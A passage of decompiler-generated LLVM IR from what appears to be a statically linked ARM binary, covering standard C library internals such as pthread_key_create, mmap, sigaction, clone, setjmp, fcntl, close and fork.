  %v7_fc24 = load i32, i32* %v6_fc24, align 4
  store i32 %v7_fc24, i32* %r3.global-to-local, align 4
  %v2_fc28 = icmp eq i32 %v7_fc24, 0
  br i1 %v2_fc28, label %dec_label_pc_fc30, label %dec_label_pc_fc48

dec_label_pc_fc30:                                ; preds = %dec_label_pc_fc20, %entry
  store i32 ptrtoint (i32* @global_var_2d1b0.533 to i32), i32* @r0, align 4
  store i32 ptrtoint (i8* @global_var_f360.273 to i32), i32* %r3.global-to-local, align 4
  store i32 64576, i32* %lr.global-to-local, align 4
  %v1_fc3c = call i32 @pthread_mutex_unlock()
  ret i32 22

dec_label_pc_fc48:                                ; preds = %dec_label_pc_fc20
  %v2_fc4c = load i32, i32* @global_var_2a7a4.195, align 4
  %v7_fc54 = icmp eq i32 %v2_fc4c, -1
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_fc5c = add i32 %v4_fc24, add (i32 ptrtoint (i32* @global_var_2b1b0.528 to i32), i32 4)
  %v3_fc5c = inttoptr i32 %v2_fc5c to i32*
  store i32 0, i32* %v3_fc5c, align 4
  %v0_fc60 = load i32, i32* %r3.global-to-local, align 4
  %v1_fc60 = load i32, i32* %r1.global-to-local, align 4
  %v2_fc60 = load i32, i32* @r4, align 4
  %v5_fc60 = mul i32 %v2_fc60, 8
  %v6_fc60 = add i32 %v5_fc60, %v1_fc60
  %v7_fc60 = inttoptr i32 %v6_fc60 to i32*
  store i32 %v0_fc60, i32* %v7_fc60, align 4
  br i1 %v7_fc54, label %dec_label_pc_fca0, label %dec_label_pc_fc68

dec_label_pc_fc68:                                ; preds = %dec_label_pc_fc48
  %v0_fc68 = call i32 @_thread_self.12()
  %v0_fc6c = load i32, i32* @r4, align 4
  %v1_fc6c = urem i32 %v0_fc6c, 32
  store i32 %v1_fc6c, i32* %lr.global-to-local, align 4
  %v3_fc70 = udiv i32 %v0_fc6c, 32
  store i32 %v3_fc70, i32* %ip.global-to-local, align 4
  store i32 %v0_fc68, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_fc78

dec_label_pc_fc78:                                ; preds = %.dec_label_pc_fc78_crit_edge, %dec_label_pc_fc68
  %v1_fc80 = phi i32 [ %v1_fc80.pre, %.dec_label_pc_fc78_crit_edge ], [ %v3_fc70, %dec_label_pc_fc68 ]
  %v0_fc80 = phi i32 [ %v2_fc94, %.dec_label_pc_fc78_crit_edge ], [ %v0_fc68, %dec_label_pc_fc68 ]
  %v1_fc78 = add i32 %v0_fc80, 44
  %v2_fc78 = inttoptr i32 %v1_fc78 to i8*
  %v3_fc78 = load i8, i8* %v2_fc78, align 1
  %v4_fc78 = zext i8 %v3_fc78 to i32
  store i32 %v4_fc78, i32* %r1.global-to-local, align 4
  %v2_fc7c = icmp eq i8 %v3_fc78, 0
  br i1 %v2_fc7c, label %dec_label_pc_fc88, label %bb6

dec_label_pc_fc88:                                ; preds = %dec_label_pc_fc78
  %v4_fc80 = mul i32 %v1_fc80, 4
  %v5_fc80 = add i32 %v4_fc80, %v0_fc80
  %v1_fc88 = add i32 %v5_fc80, 236
  %v2_fc88 = inttoptr i32 %v1_fc88 to i32*
  %v3_fc88 = load i32, i32* %v2_fc88, align 4
  %v2_fc8c = icmp eq i32 %v3_fc88, 0
  br i1 %v2_fc8c, label %bb6, label %bb

bb:                                               ; preds = %dec_label_pc_fc88
  %v3_fc90 = load i32, i32* %lr.global-to-local, align 4
  %v6_fc90 = mul i32 %v3_fc90, 4
  %v7_fc90 = add i32 %v6_fc90, %v3_fc88
  %v8_fc90 = inttoptr i32 %v7_fc90 to i32*
  store i32 %v4_fc78, i32* %v8_fc90, align 4
  %v0_fc94.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb6

bb6:                                              ; preds = %dec_label_pc_fc78, %dec_label_pc_fc88, %bb
  %v0_fc94 = phi i32 [ %v0_fc80, %dec_label_pc_fc78 ], [ %v0_fc80, %dec_label_pc_fc88 ], [ %v0_fc94.pre, %bb ]
  %v1_fc94 = inttoptr i32 %v0_fc94 to i32*
  %v2_fc94 = load i32, i32* %v1_fc94, align 4
  store i32 %v2_fc94, i32* %r3.global-to-local, align 4
  %v9_fc98 = icmp eq i32 %v2_fc94, %v0_fc68
  br i1 %v9_fc98, label %dec_label_pc_fca0, label %.dec_label_pc_fc78_crit_edge

.dec_label_pc_fc78_crit_edge:                     ; preds = %bb6
  %v1_fc80.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_fc78

dec_label_pc_fca0:                                ; preds = %bb6, %dec_label_pc_fc48
  store i32 ptrtoint (i8* @global_var_f360.273 to i32), i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2d1b0.533 to i32), i32* @r0, align 4
  store i32 64688, i32* %lr.global-to-local, align 4
  %v1_fcac = call i32 @pthread_mutex_unlock()
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_fc94, { 1, 2, 0 }
  uselistorder i32 %v3_fc70, { 1, 0 }
  uselistorder i32 %v0_fc68, { 1, 0, 2 }
  uselistorder i32 236, { 2, 3, 1, 0, 5, 6, 4 }
  uselistorder i32 ()* @_thread_self.12, { 5, 4, 1, 3, 0, 2, 6 }
  uselistorder i32* @global_var_2a7a4.195, { 3, 4, 5, 0, 6, 1, 7, 8, 9, 10, 11, 2, 12, 13, 21, 14, 15, 16, 17, 18, 19, 20 }
  uselistorder label %bb6, { 2, 1, 0 }
}

define i32 @pthread_key_create(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r7, align 4
  store i32 %arg2, i32* @r6, align 4
  %v2_fce4 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_2d1b0.533 to i32))
  store i32 0, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_2b1b0.528 to i32), i32* %r2.global-to-local, align 4
  br label %dec_label_pc_fcf0

dec_label_pc_fcf0:                                ; preds = %entry, %dec_label_pc_fd28
  %v1_fcfc = phi i32 [ 0, %entry ], [ %v1_fd28, %dec_label_pc_fd28 ]
  %v4_fcf0 = mul nuw nsw i32 %v1_fcfc, 8
  %v5_fcf0 = add i32 %v4_fcf0, ptrtoint (i32* @global_var_2b1b0.528 to i32)
  %v6_fcf0 = inttoptr i32 %v5_fcf0 to i32*
  %v7_fcf0 = load i32, i32* %v6_fcf0, align 4
  store i32 %v7_fcf0, i32* @r5, align 4
  %v2_fcf4 = icmp eq i32 %v7_fcf0, 0
  br i1 %v2_fcf4, label %dec_label_pc_fcfc, label %dec_label_pc_fd28

dec_label_pc_fcfc:                                ; preds = %dec_label_pc_fcf0
  %v0_fd00 = load i32, i32* @r6, align 4
  %v2_fd00 = add i32 %v4_fcf0, add (i32 ptrtoint (i32* @global_var_2b1b0.528 to i32), i32 4)
  %v3_fd00 = inttoptr i32 %v2_fd00 to i32*
  store i32 %v0_fd00, i32* %v3_fd00, align 4
  %v1_fd08 = load i32, i32* %r2.global-to-local, align 4
  %v2_fd08 = load i32, i32* @r4, align 4
  %v5_fd08 = mul i32 %v2_fd08, 8
  %v6_fd08 = add i32 %v5_fd08, %v1_fd08
  %v7_fd08 = inttoptr i32 %v6_fd08 to i32*
  store i32 1, i32* %v7_fd08, align 4
  store i32 ptrtoint (i32* @global_var_2d1b0.533 to i32), i32* @r0, align 4
  %v1_fd18 = call i32 @pthread_mutex_unlock()
  %v0_fd1c = load i32, i32* @r5, align 4
  %v0_fd20 = load i32, i32* @r4, align 4
  %v1_fd20 = load i32, i32* @r7, align 4
  %v2_fd20 = inttoptr i32 %v1_fd20 to i32*
  store i32 %v0_fd20, i32* %v2_fd20, align 4
  ret i32 %v0_fd1c

dec_label_pc_fd28:                                ; preds = %dec_label_pc_fcf0
  %v1_fd28 = add nuw nsw i32 %v1_fcfc, 1
  store i32 %v1_fd28, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_2b1b0.528 to i32), i32* %r2.global-to-local, align 4
  %v5_fd34 = icmp slt i32 %v1_fd28, 1024
  br i1 %v5_fd34, label %dec_label_pc_fcf0, label %dec_label_pc_fd38

dec_label_pc_fd38:                                ; preds = %dec_label_pc_fd28
  store i32 ptrtoint (i32* @global_var_2d1b0.533 to i32), i32* @r0, align 4
  %v1_fd44 = call i32 @pthread_mutex_unlock()
  ret i32 11

; uselistorder directives
  uselistorder i32 %v1_fd28, { 2, 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_2b1b0.528 to i32), { 6, 2, 1, 3, 7, 4, 0, 5 }
  uselistorder i32 ptrtoint (i32* @global_var_2d1b0.533 to i32), { 2, 3, 0, 4, 5, 1 }
  uselistorder label %dec_label_pc_fcf0, { 1, 0 }
}

define i32 @mmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_fd60 = load i32, i32* @r4, align 4
  store i32 %v3_fd60, i32* %stack_var_-12, align 4
  %v3_fd6c = urem i32 %arg3, 4096
  %v2_fd70 = icmp eq i32 %v3_fd6c, 0
  store i32 %arg2, i32* %r4.global-to-local, align 4
  br i1 %v2_fd70, label %dec_label_pc_fd94, label %dec_label_pc_fd80

dec_label_pc_fd80:                                ; preds = %entry
  %v0_fd80 = call i32 @__errno_location()
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_fd8c = inttoptr i32 %v0_fd80 to i32*
  store i32 22, i32* %v2_fd8c, align 4
  %v0_fdb8.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_fdb8

dec_label_pc_fd94:                                ; preds = %entry
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_fdb4, label %dec_label_pc_fda4

dec_label_pc_fda4:                                ; preds = %dec_label_pc_fd94
  %v0_fda4 = call i32 @__errno_location()
  %v0_fda8 = load i32, i32* %r4.global-to-local, align 4
  %v1_fda8 = sub i32 0, %v0_fda8
  %v2_fdac = inttoptr i32 %v0_fda4 to i32*
  store i32 %v1_fda8, i32* %v2_fdac, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_fdb4

dec_label_pc_fdb4:                                ; preds = %dec_label_pc_fd94, %dec_label_pc_fda4
  %v0_fdb4 = phi i32 [ %arg1, %dec_label_pc_fd94 ], [ -1, %dec_label_pc_fda4 ]
  store i32 %v0_fdb4, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_fdb8

dec_label_pc_fdb8:                                ; preds = %dec_label_pc_fd80, %dec_label_pc_fdb4
  %v0_fdb8 = phi i32 [ %v0_fdb8.pre, %dec_label_pc_fd80 ], [ %v0_fdb4, %dec_label_pc_fdb4 ]
  %v2_fdbc = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_fdbc, i32* @r4, align 4
  ret i32 %v0_fdb8

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_fdb8, { 1, 0 }
  uselistorder label %dec_label_pc_fdb4, { 1, 0 }
}

define i32 @__libc_sigaction(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-284 = alloca i32, align 4
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-296 = alloca i32, align 4
  %v3_fdc0 = load i32, i32* @r4, align 4
  %v6_fdc0 = load i32, i32* @r5, align 4
  store i32 %tmp, i32* @r4, align 4
  %v2_fdc4 = icmp eq i32* %arg2, null
  %v2_fdc8 = ptrtoint i32* %stack_var_-296 to i32
  store i32 %arg1, i32* %r6.global-to-local, align 4
  store i32 %arg3, i32* @r5, align 4
  br i1 %v2_fdc4, label %dec_label_pc_fe34, label %dec_label_pc_fdd8

dec_label_pc_fdd8:                                ; preds = %entry
  %v2_fddc = load i32, i32* %arg2, align 4
  %v4_fddc = add i32 %tmp, 4
  store i32 %v4_fddc, i32* @r1, align 4
  %v2_fde0 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_fde0, i32* @r0, align 4
  store i32 128, i32* @r2, align 4
  store i32 %v2_fddc, i32* %stack_var_-156, align 4
  %v0_fdec = call i32 @memcpy()
  store i32 %v0_fdec, i32* %r0.global-to-local, align 4
  %v0_fdf0 = load i32, i32* @r4, align 4
  %v1_fdf0 = add i32 %v0_fdf0, 132
  %v2_fdf0 = inttoptr i32 %v1_fdf0 to i32*
  %v3_fdf0 = load i32, i32* %v2_fdf0, align 4
  %v1_fdf4 = and i32 %v3_fdf0, 67108864
  %v2_fdf4 = icmp eq i32 %v1_fdf4, 0
  br i1 %v2_fdf4, label %dec_label_pc_fe08, label %bb

bb:                                               ; preds = %dec_label_pc_fdd8
  br label %dec_label_pc_fe24

dec_label_pc_fe08:                                ; preds = %dec_label_pc_fdd8
  %v1_fe10 = and i32 %v3_fdf0, 4
  %v2_fe10 = icmp eq i32 %v1_fe10, 0
  br i1 %v2_fe10, label %bb21, label %bb20

bb20:                                             ; preds = %dec_label_pc_fe08
  br label %bb21

bb21:                                             ; preds = %dec_label_pc_fe08, %bb20
  br label %dec_label_pc_fe24

dec_label_pc_fe24:                                ; preds = %bb, %bb21
  %v2_fe24 = icmp eq i32 %v0_fdf0, 0
  %v3_fe28 = ptrtoint i32* %stack_var_-156 to i32
  %.v3_fe28 = select i1 %v2_fe24, i32 0, i32 %v3_fe28
  %v0_fe34.pre = load i32, i32* @r5, align 4
  %v0_fe44.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_fe34

dec_label_pc_fe34:                                ; preds = %dec_label_pc_fe24, %entry
  %v0_fe44 = phi i32 [ %arg1, %entry ], [ %v0_fe44.pre, %dec_label_pc_fe24 ]
  %v0_fe34 = phi i32 [ %arg3, %entry ], [ %v0_fe34.pre, %dec_label_pc_fe24 ]
  %storemerge = phi i32 [ 0, %entry ], [ %.v3_fe28, %dec_label_pc_fe24 ]
  store i32 %storemerge, i32* @r1, align 4
  %v2_fe34 = icmp eq i32 %v0_fe34, 0
  %.v2_fdc8 = select i1 %v2_fe34, i32 0, i32 %v2_fdc8
  store i32 %.v2_fdc8, i32* @r2, align 4
  store i32 %v0_fe44, i32* %r0.global-to-local, align 4
  %v1_fe48 = call i32 @__syscall_rt_sigaction(i32 %v0_fe44)
  store i32 %v1_fe48, i32* %r0.global-to-local, align 4
  %v0_fe4c = load i32, i32* @r5, align 4
  %v2_fe4c = icmp eq i32 %v0_fe4c, 0
  br i1 %v2_fe4c, label %bb26, label %bb25

bb25:                                             ; preds = %dec_label_pc_fe34
  br label %bb26

bb26:                                             ; preds = %dec_label_pc_fe34, %bb25
  %v0_fe5c.pr = phi i32 [ 0, %dec_label_pc_fe34 ], [ 1, %bb25 ]
  %v1_fe54 = icmp slt i32 %v1_fe48, 0
  br i1 %v1_fe54, label %thread-pre-split.thread, label %thread-pre-split

thread-pre-split.thread:                          ; preds = %bb26
  br label %dec_label_pc_fe90

thread-pre-split:                                 ; preds = %bb26
  %v2_fe5c = icmp eq i32 %v0_fe5c.pr, 0
  store i32 %v1_fe48, i32* @r4, align 4
  br i1 %v2_fe5c, label %dec_label_pc_fe90, label %dec_label_pc_fe68

dec_label_pc_fe68:                                ; preds = %thread-pre-split
  %v2_fe68 = load i32, i32* %stack_var_-296, align 4
  store i32 %v0_fe4c, i32* %r0.global-to-local, align 4
  %v2_fe70 = inttoptr i32 %v0_fe4c to i32*
  store i32 %v2_fe68, i32* %v2_fe70, align 4
  %v3_fe70 = load i32, i32* %r0.global-to-local, align 4
  %v4_fe70 = add i32 %v3_fe70, 4
  store i32 %v4_fe70, i32* @r0, align 4
  %v2_fe74 = ptrtoint i32* %stack_var_-284 to i32
  store i32 %v2_fe74, i32* @r1, align 4
  store i32 128, i32* @r2, align 4
  %v0_fe7c = call i32 @memcpy()
  store i32 %v0_fe7c, i32* %r0.global-to-local, align 4
  %v1_fe84 = load i32, i32* @r5, align 4
  %v2_fe84 = add i32 %v1_fe84, 136
  %v3_fe84 = inttoptr i32 %v2_fe84 to i32*
  %v1_fe8c = load i32, i32* @r5, align 4
  %v2_fe8c = add i32 %v1_fe8c, 132
  %v3_fe8c = inttoptr i32 %v2_fe8c to i32*
  %v0_fe90.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_fe90

dec_label_pc_fe90:                                ; preds = %thread-pre-split.thread, %thread-pre-split, %dec_label_pc_fe68
  %v0_fe90 = phi i32 [ %v1_fe48, %thread-pre-split ], [ %v0_fe90.pre, %dec_label_pc_fe68 ], [ %v1_fe48, %thread-pre-split.thread ]
  store i32 %v0_fe90, i32* %r0.global-to-local, align 4
  store i32 %v3_fdc0, i32* @r4, align 4
  store i32 %v6_fdc0, i32* @r5, align 4
  ret i32 %v0_fe90

; uselistorder directives
  uselistorder i32 %v0_fe90, { 1, 0 }
  uselistorder i32 %v0_fe4c, { 1, 0, 2 }
  uselistorder i32 %v0_fe44, { 1, 0 }
  uselistorder i32* %stack_var_-156, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 4, 2, 3, 6, 5, 7, 0 }
  uselistorder label %dec_label_pc_fe90, { 2, 1, 0 }
  uselistorder label %bb26, { 1, 0 }
  uselistorder label %dec_label_pc_fe24, { 1, 0 }
  uselistorder label %bb21, { 1, 0 }
}

define i32 @clone(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v2_fea4 = icmp eq i32 %arg1, 0
  br i1 %v2_fea4, label %bb4, label %bb

bb:                                               ; preds = %entry
  %v3_fea8 = icmp eq i32 %arg2, 0
  br i1 %v3_fea8, label %.thread2, label %dec_label_pc_feb4

.thread2:                                         ; preds = %bb
  store i32 -22, i32* @r0, align 4
  br label %dec_label_pc_fee4

bb4:                                              ; preds = %entry
  store i32 -22, i32* @r0, align 4
  br label %dec_label_pc_fee4

dec_label_pc_feb4:                                ; preds = %bb
  %v1_feb4 = add i32 %arg2, -8
  %v0_feb8 = load i32, i32* @r3, align 4
  %v2_feb8 = add i32 %arg2, -4
  %v3_feb8 = inttoptr i32 %v2_feb8 to i32*
  store i32 %v0_feb8, i32* %v3_feb8, align 4
  %v0_febc = load i32, i32* %r0.global-to-local, align 4
  %v2_febc = inttoptr i32 %v1_feb4 to i32*
  store i32 %v0_febc, i32* %v2_febc, align 4
  %v0_fec0 = load i32, i32* @r2, align 4
  store i32 %v0_fec0, i32* %r0.global-to-local, align 4
  %v2_fec4 = call i32 @clone(i32 %v0_fec0, i32 %v1_feb4)
  store i32 %v2_fec4, i32* @r0, align 4
  %v1_fec8 = icmp slt i32 %v2_fec4, 0
  %v1_fecc = load i1, i1* @cpsr_v, align 1
  %v2_fecc = xor i1 %v1_fec8, %v1_fecc
  br i1 %v2_fecc, label %dec_label_pc_fee4, label %dec_label_pc_fed0

dec_label_pc_fed0:                                ; preds = %dec_label_pc_feb4
  %v2_fec8 = icmp eq i32 %v2_fec4, 0
  br i1 %v2_fec8, label %bb6, label %bb5

bb5:                                              ; preds = %dec_label_pc_fed0
  ret i32 %v2_fec4

bb6:                                              ; preds = %dec_label_pc_fed0
  store i32 ptrtoint (i32* @global_var_fee0.545 to i32), i32* @lr, align 4
  %v3_fedc = call i32 @unknown_0()
  store i32 %v3_fedc, i32* %r0.global-to-local, align 4
  %v1_fee0 = call i32 @__GI__exit(i32 %v3_fedc)
  unreachable

dec_label_pc_fee4:                                ; preds = %bb4, %.thread2, %dec_label_pc_feb4
  %v0_fee4 = call i32 @__syscall_error()
  store i32 %v0_fee4, i32* %r0.global-to-local, align 4
  ret i32 %v0_fee4

; uselistorder directives
  uselistorder i32 %v2_fec4, { 0, 3, 2, 1 }
  uselistorder i32* %r0.global-to-local, { 4, 2, 3, 0, 1 }
  uselistorder i1* @cpsr_v, { 1, 0, 2, 3, 4 }
  uselistorder i32 (i32, i32)* @clone, { 4, 1, 0, 3, 2 }
  uselistorder i32 -22, { 1, 0 }
  uselistorder i32 %arg2, { 2, 1, 0 }
  uselistorder label %dec_label_pc_fee4, { 2, 0, 1 }
}

define i32 @__sigsetjmp(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_0 = alloca i32, align 4
  %v2_feec = load i32, i32* @r4, align 4
  store i32 %v2_feec, i32* %arg1, align 4
  %v3_feec = add i32 %tmp, 4
  %v4_feec = inttoptr i32 %v3_feec to i32*
  %v5_feec = load i32, i32* @r5, align 4
  store i32 %v5_feec, i32* %v4_feec, align 4
  %v6_feec = add i32 %tmp, 8
  %v7_feec = inttoptr i32 %v6_feec to i32*
  %v8_feec = load i32, i32* @r6, align 4
  store i32 %v8_feec, i32* %v7_feec, align 4
  %v9_feec = add i32 %tmp, 12
  %v10_feec = inttoptr i32 %v9_feec to i32*
  %v11_feec = load i32, i32* @r7, align 4
  store i32 %v11_feec, i32* %v10_feec, align 4
  %v12_feec = add i32 %tmp, 16
  %v13_feec = inttoptr i32 %v12_feec to i32*
  %v14_feec = load i32, i32* @r8, align 4
  store i32 %v14_feec, i32* %v13_feec, align 4
  %v15_feec = add i32 %tmp, 20
  %v16_feec = inttoptr i32 %v15_feec to i32*
  %v17_feec = load i32, i32* @sb, align 4
  store i32 %v17_feec, i32* %v16_feec, align 4
  %v18_feec = add i32 %tmp, 24
  %v19_feec = inttoptr i32 %v18_feec to i32*
  %v20_feec = load i32, i32* @sl, align 4
  store i32 %v20_feec, i32* %v19_feec, align 4
  %v21_feec = add i32 %tmp, 28
  %v22_feec = inttoptr i32 %v21_feec to i32*
  %v23_feec = load i32, i32* @fp, align 4
  store i32 %v23_feec, i32* %v22_feec, align 4
  %v24_feec = add i32 %tmp, 32
  %v25_feec = inttoptr i32 %v24_feec to i32*
  %v27_feec = ptrtoint i32* %stack_var_0 to i32
  store i32 %v27_feec, i32* %v25_feec, align 4
  %v28_feec = add i32 %tmp, 36
  %v29_feec = inttoptr i32 %v28_feec to i32*
  %v30_feec = load i32, i32* @lr, align 4
  store i32 %v30_feec, i32* %v29_feec, align 4
  %v0_fef4 = call i32 @__sigjmp_save()
  ret i32 %v0_fef4

; uselistorder directives
  uselistorder i32 %tmp, { 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
}

define i32 @__default_sa_restorer(%sigcontext* %scp) local_unnamed_addr {
entry:
  %v3_fef8 = call i32 @sigreturn(%sigcontext* %scp)
  ret i32 %v3_fef8
}

define i32 @__default_rt_sa_restorer(%sigcontext* %scp) local_unnamed_addr {
entry:
  %v3_fefc = call i32 @sigreturn(%sigcontext* %scp)
  ret i32 %v3_fefc
}

define i32 @__libc_fcntl(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %v1_ff10 = add i32 %arg1, -12
  store i32 %arg2, i32* @r3, align 4
  %tmp = icmp ugt i32 %v1_ff10, 2
  br i1 %tmp, label %dec_label_pc_ff38, label %dec_label_pc_ff30

dec_label_pc_ff30:                                ; preds = %entry
  %v0_ff30 = call i32 @__GI_fcntl64()
  br label %dec_label_pc_ff64

dec_label_pc_ff38:                                ; preds = %entry
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg1, i32* @r1, align 4
  %v0_ff40 = call i32 @fcntl()
  store i32 %v0_ff40, i32* %r4.global-to-local, align 4
  %tmp8 = icmp ult i32 %v0_ff40, -4095
  br i1 %tmp8, label %dec_label_pc_ff64, label %dec_label_pc_ff50

dec_label_pc_ff50:                                ; preds = %dec_label_pc_ff38
  %v0_ff50 = call i32 @__errno_location()
  %v0_ff54 = load i32, i32* %r4.global-to-local, align 4
  %v1_ff54 = sub i32 0, %v0_ff54
  %v2_ff58 = inttoptr i32 %v0_ff50 to i32*
  store i32 %v1_ff54, i32* %v2_ff58, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_ff64

dec_label_pc_ff64:                                ; preds = %dec_label_pc_ff50, %dec_label_pc_ff38, %dec_label_pc_ff30
  %storemerge = phi i32 [ %v0_ff30, %dec_label_pc_ff30 ], [ %v0_ff40, %dec_label_pc_ff38 ], [ -1, %dec_label_pc_ff50 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_ff40, { 1, 0, 2 }
}

define i32 @__GI_fcntl64() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %v0_ff94 = load i32, i32* @r0, align 4
  store i32 %v0_ff94, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_ff94, -4095
  br i1 %tmp, label %dec_label_pc_ffb0, label %dec_label_pc_ffa0

dec_label_pc_ffa0:                                ; preds = %entry
  %v0_ffa0 = call i32 @__errno_location()
  %v0_ffa4 = load i32, i32* %r4.global-to-local, align 4
  %v1_ffa4 = sub i32 0, %v0_ffa4
  %v2_ffa8 = inttoptr i32 %v0_ffa0 to i32*
  store i32 %v1_ffa4, i32* %v2_ffa8, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_ffb0

dec_label_pc_ffb0:                                ; preds = %entry, %dec_label_pc_ffa0
  %v0_ffb0 = phi i32 [ %v0_ff94, %entry ], [ -1, %dec_label_pc_ffa0 ]
  ret i32 %v0_ffb0

; uselistorder directives
  uselistorder i32 %v0_ff94, { 1, 0, 2 }
  uselistorder label %dec_label_pc_ffb0, { 1, 0 }
}

define i32 @__syscall_rt_sigaction(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_ffc4 = load i32, i32* @r4, align 4
  store i32 %v3_ffc4, i32* %stack_var_-8, align 4
  %v1_ffc8 = load i32, i32* @r1, align 4
  %v2_ffc8 = inttoptr i32 %v1_ffc8 to %sigaction*
  %v3_ffc8 = load i32, i32* @r2, align 4
  %v4_ffc8 = inttoptr i32 %v3_ffc8 to %sigaction*
  %v5_ffc8 = call i32 @sigaction(i32 %arg1, %sigaction* %v2_ffc8, %sigaction* %v4_ffc8)
  store i32 %v5_ffc8, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_ffc8, -4095
  br i1 %tmp, label %dec_label_pc_ffe8, label %dec_label_pc_ffd8

dec_label_pc_ffd8:                                ; preds = %entry
  %v0_ffd8 = call i32 @__errno_location()
  %v0_ffdc = load i32, i32* %r4.global-to-local, align 4
  %v1_ffdc = sub i32 0, %v0_ffdc
  %v2_ffe0 = inttoptr i32 %v0_ffd8 to i32*
  store i32 %v1_ffdc, i32* %v2_ffe0, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_ffe8

dec_label_pc_ffe8:                                ; preds = %entry, %dec_label_pc_ffd8
  %v0_ffe8 = phi i32 [ %v5_ffc8, %entry ], [ -1, %dec_label_pc_ffd8 ]
  %v2_ffec = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_ffec, i32* %r4.global-to-local, align 4
  ret i32 %v0_ffe8

; uselistorder directives
  uselistorder i32 %v5_ffc8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_ffe8, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @__GI__exit(i32 %arg1) local_unnamed_addr #0 {
entry:
  store i32 %arg1, i32* @r5, align 4
  call void @exit(i32 %arg1)
  unreachable
}

define i32 @__libc_close(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_10018 = load i32, i32* @r4, align 4
  store i32 %v3_10018, i32* %stack_var_-8, align 4
  %v0_1001c = call i32 @close()
  store i32 %v0_1001c, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1001c, -4095
  br i1 %tmp, label %dec_label_pc_1003c, label %dec_label_pc_1002c

dec_label_pc_1002c:                               ; preds = %entry
  %v0_1002c = call i32 @__errno_location()
  %v0_10030 = load i32, i32* %r4.global-to-local, align 4
  %v1_10030 = sub i32 0, %v0_10030
  %v2_10034 = inttoptr i32 %v0_1002c to i32*
  store i32 %v1_10030, i32* %v2_10034, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1003c

dec_label_pc_1003c:                               ; preds = %entry, %dec_label_pc_1002c
  %v0_1003c = phi i32 [ %v0_1001c, %entry ], [ -1, %dec_label_pc_1002c ]
  %v2_10040 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_10040, i32* @r4, align 4
  ret i32 %v0_1003c

; uselistorder directives
  uselistorder i32 %v0_1001c, { 1, 0, 2 }
  uselistorder i32 ()* @close, { 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_1003c, { 1, 0 }
}

define i32 @__libc_fork(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_10044 = load i32, i32* @r4, align 4
  store i32 %v3_10044, i32* %stack_var_-8, align 4
  %v0_10048 = call i32 @fork()
  store i32 %v0_10048, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_10048, -4095
  br i1 %tmp, label %dec_label_pc_10068, label %dec_label_pc_10058

dec_label_pc_10058:                               ; preds = %entry
  %v0_10058 = call i32 @__errno_location()
  %v0_1005c = load i32, i32* %r4.global-to-local, align 4
